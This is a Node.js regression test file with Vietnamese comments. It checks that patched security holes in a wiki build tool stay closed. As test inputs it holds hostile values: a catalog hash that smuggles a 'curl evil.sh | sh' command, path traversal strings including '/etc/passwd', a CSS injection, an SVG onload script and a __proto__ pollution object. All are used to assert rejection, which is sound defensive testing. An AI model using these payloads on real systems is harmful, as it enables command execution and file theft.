// Test chống hồi quy cho các lỗ bảo mật đã vá — sửa code sau này mà mở lại lỗ là test đỏ.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateCatalog, containedPath } from '../lib/validate.mjs';
import { extractClient } from '../lib/client.mjs';
import { parseLiteral } from '../lib/literal.mjs';
import { request, TooLarge } from '../lib/http.mjs';
import { toWebp } from '../lib/image.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');
const goodCatalog = () => ({
  catalog_hash: 'a'.repeat(64),
  catalog: {
    species: Array.from({ length: 12 }, (_, i) => ({ id: `unit_h${i}`, catchable: true })),
    abilities: [{}], modifiers: [{}], display_names: [{}], research: [{ id: 'research_r000' }],
  },
});

test('catalog: hash chứa lệnh shell / id chứa đường dẫn bị từ chối', () => {
  assert.deepEqual(validateCatalog(goodCatalog()), []);
  const evilHash = goodCatalog(); evilHash.catalog_hash = '"; curl evil.sh | sh #';
  assert.ok(validateCatalog(evilHash).includes('catalog_hash'));
  const evilId = goodCatalog(); evilId.catalog.species[0].id = '../../.github/workflows/x';
  assert.ok(validateCatalog(evilId).length);
  const evilResearch = goodCatalog(); evilResearch.catalog.research[0].id = '..%2f..';
  assert.ok(validateCatalog(evilResearch).length);
});

test('đường dẫn ảnh không thoát được khỏi public/<dir>/', () => {
  const pub = join(ROOT, 'public'), dirs = [join(pub, 'portraits')];
  assert.ok(containedPath(pub, dirs, 'portraits/pet_a.webp').endsWith('pet_a.webp'));
  for (const k of ['portraits/../../package.json', '../scripts/x.webp', '/etc/passwd', 'portraits', 'research/x.webp']) {
    assert.throws(() => containedPath(pub, dirs, k), k);
  }
});

test('bundle: tên model / màu bẩn bị lọc', () => {
  const c = extractClient('v={unit_h001:`../../x`,unit_h002:`ok_m`,unit_h003:`a b`},m={normal:[[1,2,3],[4,5,6],[7,8,9]],fire:[["red);background:url(//evil)",2,3],[4,5,6],[7,8,999]]}');
  assert.deepEqual(c.unitModel, { unit_h002: 'ok_m' });
  assert.deepEqual(c.elementColors.fire, [[0, 2, 3], [4, 5, 6], [7, 8, 255]]);
});

test('parser literal: __proto__ không đổi được prototype', () => {
  const { value } = parseLiteral('{__proto__:{polluted:1},constructor:{x:1},a:1}');
  assert.equal(Object.getPrototypeOf(value), Object.prototype);
  assert.equal(value.a, 1);
  assert.equal({}.polluted, undefined);
});

test('http: server trả dữ liệu khổng lồ bị cắt, không tràn RAM', async () => {
  const big = `data:application/octet-stream;base64,${Buffer.alloc(64 * 1024).toString('base64')}`;
  await assert.rejects(request(big, { maxBytes: 1024, retries: 0 }), TooLarge);
  assert.equal((await request(big, { maxBytes: 128 * 1024, retries: 0 })).body.length, 64 * 1024);
});

test('ảnh: chỉ nhận PNG thật', async () => {
  assert.throws(() => toWebp(Buffer.from('<svg onload=alert(1)>')), /PNG/);
  assert.throws(() => toWebp(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0])), /PNG/);
  const png = readFileSync(join(ROOT, 'public/favicon.png'));
  assert.ok((await toWebp(png)).subarray(8, 12).toString() === 'WEBP');
});

test('workflow: không chèn output/dữ liệu vào shell, action ghim SHA, quyền tối thiểu', () => {
  const yml = readFileSync(join(ROOT, '.github/workflows/site.yml'), 'utf8');
  const runs = [...yml.matchAll(/run: \|?\n?([\s\S]*?)(?=\n\s*- |\n\s*\w+:\n|$)/g)].map(m => m[1]);
  for (const r of runs) assert.doesNotMatch(r, /\$\{\{\s*(steps|needs|inputs|github\.event)\./, `run: có \${{ }} nguy hiểm:\n${r}`);
  for (const [, ref] of yml.matchAll(/uses:\s*(\S+)/g)) assert.match(ref, /@[0-9a-f]{40}$/, `action chưa ghim SHA: ${ref}`);
  assert.match(yml, /^permissions: \{\}$/m);
  assert.match(yml, /npm ci --ignore-scripts/);
});

test('wiki build có CSP, không script inline', () => {
  const cfg = readFileSync(join(ROOT, 'vite.config.js'), 'utf8');
  const scriptSrc = cfg.match(/"script-src[^"]*"/)?.[0] ?? '';
  assert.equal(scriptSrc, `"script-src 'self'"`);
  for (const f of ['index.html', 'src/main.js', 'src/ui.js']) assert.doesNotMatch(readFileSync(join(ROOT, f), 'utf8'), /\son[a-z]+="/, f);
});
